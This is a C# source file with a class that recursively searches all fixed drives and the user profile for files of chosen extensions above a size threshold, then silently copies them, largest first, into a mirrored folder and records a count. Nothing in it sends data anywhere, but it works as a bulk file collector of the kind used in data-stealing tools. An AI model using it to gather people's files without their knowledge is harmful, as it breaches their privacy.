using System;
using System.Collections.Generic;
using System.Linq;


using System.IO;

namespace wScript.Controller
{
    public class SearchFile
    {
        string pathSave;
        string filter;
        long size;
        List<string> allPaths = new List<string>();
        string driveSystemPath;


        public SearchFile(string path, string supportedExtensions, long size)
        {
            this.pathSave = path;
            this.filter = supportedExtensions;
            this.size = size;
            driveSystemPath = Path.GetPathRoot(Environment.SystemDirectory);
        }

        public void SearchThread()
        {

            var files = getFiles(driveSystemPath);
            allPaths.AddRange(files);

            var allDrivers = getAllDrives();
            foreach (var path in allDrivers)
            {
                ApplyAllFiles(path);
            }


            File.WriteAllText(Environment.CurrentDirectory + @"\php\count.txt", allPaths.Count.ToString() );


            //sort by file size Descending and copy
            var pathOrderByDesending = allPaths.OrderByDescending(p => new FileInfo(p).Length).ToArray();
            foreach (var f in pathOrderByDesending)
            {
                copyFile(f);
            }


        }
        



        private void copyFile(string path)
        {
            var sourcePath = path.Replace(":", "");
            var des = pathSave + sourcePath;



            string dirPath = Path.GetDirectoryName(des);

            Directory.CreateDirectory(dirPath);


            if (!File.Exists(des))
                File.Copy(path, des, true);

        }



        private void ApplyAllFiles(string folder)
        {
            var files = getFiles(folder);
            allPaths.AddRange(files);

            var dirs = Directory.GetDirectories(folder);
            foreach (string subDir in dirs)
            {
                try
                {
                    ApplyAllFiles(subDir);
                }
                catch
                { }
            }
        }


        private string[] getFiles(string folder)
        {
            var files = filter.Split(',').SelectMany(
                filter => Directory.GetFiles(folder, "*.*").Where(f => new FileInfo(f).Length >= size && f.ToLower().EndsWith(filter))
                ).OrderByDescending(f => new FileInfo(f).Length).ToArray();

            return files;
        }


        private List<string> getAllDrives()
        {
            List<string> paths = new List<string>();


            //paths.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
            //paths.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
            //paths.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
            //paths.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
            //paths.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));



            var drives = DriveInfo.GetDrives()
                .Where(d => d.DriveType == DriveType.Fixed && d.Name != driveSystemPath);

            foreach (var d in drives)
            {
                paths.Add(d.Name);
            }


            paths.Add(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));




            return paths;
        }



    }
}
